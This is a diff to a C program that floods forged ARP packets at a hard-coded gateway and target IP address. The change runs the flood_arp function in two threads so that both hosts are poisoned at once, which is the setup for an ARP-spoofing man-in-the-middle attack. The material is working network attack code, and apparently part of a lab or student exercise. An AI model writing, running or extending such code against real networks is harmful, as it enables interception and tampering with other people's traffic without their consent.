@@ -13,6 +13,7 @@
 #include <netinet/ether.h>
 #include <netinet/if_ether.h>
 #include <netinet/in.h>
+#include <pthread.h>
 #include <stddef.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -32,6 +33,12 @@
 //#define TARGET_IP "8.8.8.8"
 #define GATEWAY_IP "142.232.49.6"
 #define TARGET_IP "142.232.48.123"
+
+struct thread_arg {
+    int sock;
+    unsigned char* victim_mac;
+    uint32_t victim_ip;
+};
 
 unsigned char local_mac[6];
 int local_interface_index;
@@ -133,7 +140,12 @@ int create_packet_socket(void) {
     return pack_sock;
 }
 
-void flood_arp(const int sock, const unsigned char* victim_mac, const uint32_t victim_ip) {
+void* flood_arp(void* ta) {
+    const struct thread_arg* args = (const struct thread_arg*) ta;
+    const int sock = args->sock;
+    const unsigned char* victim_mac = args->victim_mac;
+    const uint32_t victim_ip = args->victim_ip;
+
     unsigned char buffer[sizeof(struct ether_arp) + sizeof(struct ether_arp)];
     memset(buffer, 0, sizeof(struct ether_arp) + sizeof(struct ether_arp));
 
@@ -179,6 +191,7 @@ void flood_arp(const int sock, const unsigned char* victim_mac, const uint32_t v
 
     sendto(sock, buffer, sizeof(struct ether_header) + sizeof(struct ether_arp), 0,
             (struct sockaddr*) &addr, sizeof(struct sockaddr_ll));
+    return NULL;
 }
 
 int main(void) {
@@ -218,7 +231,25 @@ int main(void) {
     printf("%02x %02x %02x %02x %02x %02x\n", target_mac[0], target_mac[1], target_mac[2],
             target_mac[3], target_mac[4], target_mac[5]);
 
-    flood_arp(pack_sock, gateway_mac, gateway_ip);
+    struct thread_arg ta;
+    ta.sock = pack_sock;
+    ta.victim_mac = gateway_mac;
+    ta.victim_ip = gateway_ip;
+
+    pthread_t one;
+    pthread_t two;
+
+    pthread_create(&one, NULL, flood_arp, &ta);
+
+    struct thread_arg tb;
+    tb.sock = pack_sock;
+    tb.victim_mac = target_mac;
+    tb.victim_ip = target_ip;
+
+    pthread_create(&two, NULL, &flood_arp, &tb);
+
+    pthread_join(one, NULL);
+    pthread_join(two, NULL);
 
     return EXIT_SUCCESS;
 }
